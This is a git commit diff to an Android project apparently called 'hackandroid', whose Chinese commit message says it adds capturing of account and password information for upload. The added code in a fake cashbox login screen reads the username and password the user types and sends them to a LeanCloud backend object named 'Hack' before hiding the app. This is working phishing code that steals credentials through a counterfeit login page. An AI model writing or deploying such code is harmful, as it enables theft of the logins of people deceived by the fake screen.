619eb861849cf451df1efebc1ec1f283d19ab03c
zhangjun <zhangjun@zhangjundeiMac.local>
2017-09-11 11:44:45 +0800

    添加获取账号密码信息上送

--- app/src/main/java/com/iboxpay/hackandroid/FakeCashboxLoginActivity.java
+++ app/src/main/java/com/iboxpay/hackandroid/FakeCashboxLoginActivity.java
@@ -4,9 +4,15 @@ import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.view.View;
 import android.widget.Button;
+import android.widget.EditText;
+import com.avos.avoscloud.AVException;
+import com.avos.avoscloud.AVObject;
+import com.avos.avoscloud.SaveCallback;
 
-public class FakeCashboxLoginActivity extends AppCompatActivity implements View.OnClickListener{
+public class FakeCashboxLoginActivity extends AppCompatActivity implements View.OnClickListener {
     private Button mLoginBtn;
+    private EditText mUserNameEt;
+    private EditText mPasswordEt;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -14,12 +20,18 @@ public class FakeCashboxLoginActivity extends AppCompatActivity implements View.
         setContentView(R.layout.activity_fake_cashbox_login);
         mLoginBtn = (Button) findViewById(R.id.btn_login_submit);
         mLoginBtn.setOnClickListener(this);
+        mUserNameEt = (EditText) findViewById(R.id.edtTxt_login_userName);
+        mPasswordEt = (EditText) findViewById(R.id.edtTxt_login_pwd);
     }
 
     @Override
     public void onClick(View v) {
         switch (v.getId()) {
             case R.id.btn_login_submit:
+                AVObject product = new AVObject("Hack");
+                product.put("useName", mUserNameEt.getText().toString());
+                product.put("password", mPasswordEt.getText().toString());
+                product.saveInBackground();
                 moveTaskToBack(true);
                 break;
             default:
